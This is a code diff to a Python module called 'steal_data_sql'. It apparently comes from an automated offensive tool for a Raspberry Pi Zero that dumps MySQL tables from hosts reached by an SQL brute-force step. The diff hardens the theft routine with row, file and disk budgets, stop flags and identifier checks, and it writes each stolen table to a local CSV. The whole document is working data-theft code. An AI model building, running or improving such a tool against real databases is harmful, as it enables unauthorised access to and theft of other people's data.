@@ -1,4 +1,5 @@
 import os
+import shutil
 import logging
 import time
 from sqlalchemy import create_engine
@@ -16,6 +17,12 @@ b_module = "steal_data_sql"
 b_status = "steal_data_sql"
 b_parent = "SQLBruteforce"
 b_port = 3306
+
+# Hard caps so a giant table cannot OOM or fill a 512 MB Pi Zero (matches the ftp/smb steal caps).
+MAX_ROWS = 100_000                  # cap the SELECT so a huge table can't be pulled into RAM
+MAX_FILE_BYTES = 50 * 1024 * 1024   # 50 MB per dumped table
+MAX_RUN_BYTES = 200 * 1024 * 1024   # 200 MB per host run
+MIN_FREE_BYTES = 100 * 1024 * 1024  # refuse write if < 100 MB free
 
 class StealDataSQL:
     """
@@ -72,17 +79,56 @@ class StealDataSQL:
     def steal_data(self, engine, table, schema, local_dir):
         """
         Download data from the table in the database to a local file.
+
+        SELECT * without a LIMIT can pull a multi-GB table into RAM on a 512 MB
+        Pi Zero.  We cap rows, enforce free-space and per-run byte budgets, and
+        refuse to write if the resulting CSV would blow the cap.
         """
         try:
-            if self.shared_data.orchestrator_should_exit:
+            if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
                 logger.info("Data stealing process interrupted due to orchestrator exit.")
                 return
-            query = f"SELECT * FROM {schema}.{table}"
+            try:
+                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
+            except Exception:
+                free = shutil.disk_usage('/').free
+            if free < MIN_FREE_BYTES:
+                logger.error(f"Refusing SQL steal: only {free} bytes free (need {MIN_FREE_BYTES})")
+                self.stop_execution = True
+                return
+            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
+                logger.warning(f"SQL per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
+                self.stop_execution = True
+                return
+
+            # Identifier quoting: schema/table come from INFORMATION_SCHEMA, but we
+            # still refuse anything that is not a simple identifier.
+            import re as _re
+            if not _re.fullmatch(r'[A-Za-z0-9_$]+', schema or '') or not _re.fullmatch(r'[A-Za-z0-9_$]+', table or ''):
+                logger.error(f"Refusing SQL steal of non-identifier {schema}.{table}")
+                return
+
+            query = f"SELECT * FROM `{schema}`.`{table}` LIMIT {MAX_ROWS}"
             import pandas as pd  # lazy: keep pandas out of module import (P2)
             df = pd.read_sql(query, engine)
+
+            os.makedirs(local_dir, exist_ok=True)
             local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
             df.to_csv(local_file_path, index=False)
-            logger.success(f"Downloaded data from table {schema}.{table} to {local_file_path}")
+            size = os.path.getsize(local_file_path)
+            if size > MAX_FILE_BYTES or getattr(self, '_run_bytes', 0) + size > MAX_RUN_BYTES:
+                logger.warning(f"SQL dump {schema}.{table} is {size} bytes — over budget, deleting")
+                try:
+                    os.unlink(local_file_path)
+                except OSError:
+                    pass
+                self.stop_execution = True
+                return
+            self._run_bytes = getattr(self, '_run_bytes', 0) + size
+            logger.success(
+                f"Downloaded data from table {schema}.{table} to {local_file_path} "
+                f"({len(df)} rows, {size} bytes)"
+            )
         except Exception as e:
             logger.error(f"Error downloading data from table {schema}.{table}: {e}")
 
@@ -101,6 +147,7 @@ class StealDataSQL:
                 # success left *_connected True and disarmed the timeout for good.
                 self.stop_execution = False
                 self.sql_connected = False
+                self._run_bytes = 0
                 settle_for_display(self.shared_data)  # let the panel show this action's name
                 logger.info(f"Stealing data from {ip}:{port}...")
 
